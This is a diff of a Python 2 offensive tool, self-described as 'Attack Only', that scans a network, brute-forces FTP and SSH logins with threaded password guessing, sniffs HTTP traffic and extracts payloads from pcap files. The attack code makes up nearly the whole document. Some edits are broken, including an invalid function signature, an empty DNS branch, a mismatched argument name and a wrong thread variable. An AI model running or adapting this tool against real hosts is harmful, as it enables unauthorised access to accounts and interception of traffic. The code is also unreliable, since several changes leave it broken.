@@ -56,7 +56,7 @@ def factorisation(length):
 	if length == 1: return length
 	return factorisation(length-1)*length
 
-def pwd_aplha(lgr,mode):
+def pwd_aplha(lgr, mode):
 	if mode == 'alpha':
 		return ''.join(ascii_lowercase[randint(0,len(ascii_lowercase)-1)] for i in range(int(lgr)))
 	elif mode == 'digits':
@@ -64,7 +64,7 @@ def pwd_aplha(lgr,mode):
 	else:
 		return ''.join(big[randint(0,len(big)-1)] for i in range(int(lgr)))
 
-def generate(mode,lgr):
+def generate(mode, lgr):
 	stop = False
 	if mode == 'alpha':
 		len_mode = factorisation(ascii_lowercase)
@@ -88,7 +88,7 @@ def generate(mode,lgr):
 		return pwd
 	return pwd
 
-def detonate(log,addr,psswd):
+def detonate(log, addr, psswd):
 	global ftop
 	trig = FTP(addr)
 	try:
@@ -97,11 +97,10 @@ def detonate(log,addr,psswd):
 		if "successful" in ret:
 			ftop = 1
 			sys.stdout.write('\n\n\033[94m[+]\033[0m FTP YEAH : ' + addr + ' --> ' + psswd + '\n\n')
-			sys.exit(0)
 	except:
 		trig.close()
 
-def ssh_conn(log,addr,passwd):
+def ssh_conn(log, addr, passwd):
 	global flag
 	try:
 		client = SSHClient()
@@ -112,7 +111,6 @@ def ssh_conn(log,addr,passwd):
 			timeout=10,
 			look_for_keys=False)
 		print '\n\n\033[94m[+]\033[0m SSH YEAH : ' + addr + ' --> ' + psswd + '\n\n'
-		sys.exit(0)
 		flag = 1
 	except:
 		pass
@@ -226,14 +224,22 @@ def port_scan(ip):
 	else:
 		print '\n\033[92m[*]\033[0m Scan du réseau distant:'
 		all_hosts = network_scan(ip)
+		threads = []
 		for host in all_hosts:
 			proc = Thread(target=checkhost,args=(host,))
+			threads.append(proc)
 			proc.start()
+		for thr in threads:
+			thr.join()
 	if ips_o:
 		print '\n\033[92m[*]\033[0m Scan de port sur les machines ARPées:'
+		threads = []
 		for ip in ips_o:
 			proc = Thread(target=scanner,args=(ip,))
+			threads.append(proc)
 			proc.start()
+		for thr in threads:
+			thr.join()
 	else:
 		sys.exit('\n\033[91m[-]\033[0m Aucune IP trouvée sur le réseau.\n')
 	print '\n\033[94m[+]\033[0m Résumé du scan de ports:\n', online
@@ -258,43 +264,46 @@ def get_http_headers(http_payload):
         	return None
     	return headers
 
-def pcap(pc):
+def pcap(pc, protocol.lower()):
     	try:
         	pcap = rdpcap(pc)
         	p = pcap.sessions()
     	except IOError:
         	sys.exit("\033[91m[-]\033[0m IOError.")
     	for session in p:
-        	idx, flag = 0, 0
-        	concat = ''
-        	print blu, '\n[ Nouvelle Session = %s ]' % p[session], nat
-        	for pkt in p[session]:
-        		if pkt.haslayer(TCP) and pkt.haslayer(Raw) and (pkt[TCP].flags == 24L or pkt[TCP].flags == 16):
-                		print '\033[91m\nPacket [ %d ] -------------- Nouveau Payload -------------\033[0m \n\n' % idx
-                		payload = pkt[TCP].payload
-                		load = pkt[TCP].load
-                		headers = get_http_headers(load)
-                		if headers is not None and ' gzip' in headers.values():
-                			print load[:15]
-                    			for k,v in headers.iteritems():
-                        			print k,':',v
-                    			tab = load.split('\r\n')
-                    			concat += tab[-1]
-                    			flag = 1
-                		elif flag != 0 and headers is None:
-                    			tab = load.split('\r\n')
-                    			concat += tab[-1]
-                    			try:
-                        			sio = StringIO.StringIO(concat)
-                        			gz = gzip.GzipFile(fileobj=sio)
-                        			print gz.read()
-                        			flag = 0
-                        			concat = ''
-                    			except:
-                        			pass
-                		else:
-		                	print payload
-			idx += 1
+		if protocol == 'http':
+			idx, flag = 0, 0
+			concat = ''
+			print blu, '\n[ Nouvelle Session = %s ]' % p[session], nat
+			for pkt in p[session]:
+				if pkt.haslayer(TCP) and pkt.haslayer(Raw) and (pkt[TCP].flags == 24L or pkt[TCP].flags == 16):
+					print '\033[91m\nPacket [ %d ] -------------- Nouveau Payload -------------\033[0m \n\n' % idx
+					payload = pkt[TCP].payload
+					load = pkt[TCP].load
+					headers = get_http_headers(load)
+					if headers is not None and ' gzip' in headers.values():
+						print load[:15]
+						for k,v in headers.iteritems():
+							print k,':',v
+						tab = load.split('\r\n')
+						concat += tab[-1]
+						flag = 1
+					elif flag != 0 and headers is None:
+						tab = load.split('\r\n')
+						concat += tab[-1]
+						try:
+							sio = StringIO.StringIO(concat)
+							gz = gzip.GzipFile(fileobj=sio)
+							print gz.read()
+							flag = 0
+							concat = ''
+						except:
+							pass
+					else:
+						print payload
+				idx += 1
+		elif protocol == 'dns':
+			
 
 def get_args():
 	args = ArgumentParser(version='1.5',description='Attack Only, made by Cesium133.')
@@ -323,8 +332,8 @@ def get_args():
 		action='store',
 		nargs=1,
 		default='3',
-		help='Longueur souhaitée.')
-	args.add_argument('-p','--pcap',
+		help='Longueur des mots de passe souhaitée.')
+	args.add_argument('-r','--rdpcap',
 		action='store',
 		nargs=1,
 		help='Analyse un pcap pour déceler les requetes HTTP.')
@@ -344,7 +353,7 @@ if __name__ == '__main__':
 #		pool = Pool(4)
 #		pool.map(detonate,dico,4)
 
-	if args.pcap is not None:
+	if args.rdpcap is not None:
 		pcap(args.pcap[0])
 		sys.exit(0)
 
@@ -369,20 +378,24 @@ if __name__ == '__main__':
 		online = []
 		print '\033[91m[-]\033[0m Online est vide après le scan de port.\n'
 
-	if online:
+	if online is not None:
 		if args.bruteforce:
 			idx = 0
 			for host in online:
 				if 21 in online[host]:
 					print "\033[94m[+]\033[0m Cible avec FTP ouvert : %s." % host
 					try:
+						threads = []
 						for item in dic:
 							t = Thread(target=detonate,args=(user,ip,item,))
+							threads.append(t)
 							t.start()
 							idx += 1
 							if ftop == 1:
 								ftop = 0
 								break
+						for thr in threads:
+			 				thr.join()
 					except KeyboardInterrupt:
 						print '\n\n[*] Nbr d\'essais '+ str(idx)
 						idx = 0
@@ -393,20 +406,23 @@ if __name__ == '__main__':
 				if 22 in online[host]:
 					print "\033[94m[+]\033[0m Cible avec SSH ouvert : %s." % host
 					try:
+						threads = []
 						for psswd in dic:
 							conn = Thread(target=ssh_conn,args=(user,addr,psswd,))
+							threads.append(t)
 							conn.start()
 							idx += 1
-							if flag == 1: break
-						if flag == 1:
-							flag = 0
-							break
+							if flag == 1:
+								flag = 0
+								break
+						for thr in threads:
+							thr.join()
 					except KeyboardInterrupt:
 						print '\n\n[*] Nbr d\'essais '+ str(idx)
 						idx = 0
 					except Exception as e:
 						logger.error("\033[91m[-]\033[0m %s", e.strerror)
-			print '\n\033[94m[+]\033[0m # Job done #\n'
+			sys.exit('\n\033[94m[+]\033[0m # Job done #\n')
 		else:
 			for host in online:
 				if 80 in online[host]:
@@ -415,6 +431,6 @@ if __name__ == '__main__':
 						wrpcap(host + '-filtered.pcap', sniffed, append=True)
 					except KeyboardInterrupt:
 						wrpcap('filtered.pcap', sniffed, append=True)
-			print '\n\033[94m[+]\033[0m # Job done #\n'
+			sys.exit('\n\033[94m[+]\033[0m # Job done #\n')
 	else:
 		sys.exit('\033[91m[-]\033[0m Afin de poursuivre l\'analyse, vous devez mentionner un mode (wordlist / mode de bf).')
